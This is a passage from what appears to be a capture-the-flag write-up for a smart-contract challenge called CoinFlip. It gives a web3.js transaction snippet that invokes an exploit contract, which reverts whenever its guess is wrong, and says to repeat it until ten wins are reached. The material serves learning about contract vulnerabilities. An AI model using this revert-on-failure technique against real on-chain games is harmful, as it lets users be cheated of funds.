## 3. CoinFlip
CoinFlipExploit, with its flip(bool) function, will call CoinFlip's flip(bool) function and will revert all state changes if the guess is incorrect.
```javascript
web3.eth.sendTransaction({
    to:attacker,
    from:player,
    data: web3.eth.abi.encodeFunctionCall({
        name: 'flip',
        type: 'function',
        inputs: [{
            type: 'bool',
            name: '_guess'
        }]
    }, [true])
})
```

We can call this function several times until it reaches 10 correct transactions.
Reverted transactions can be ignored.
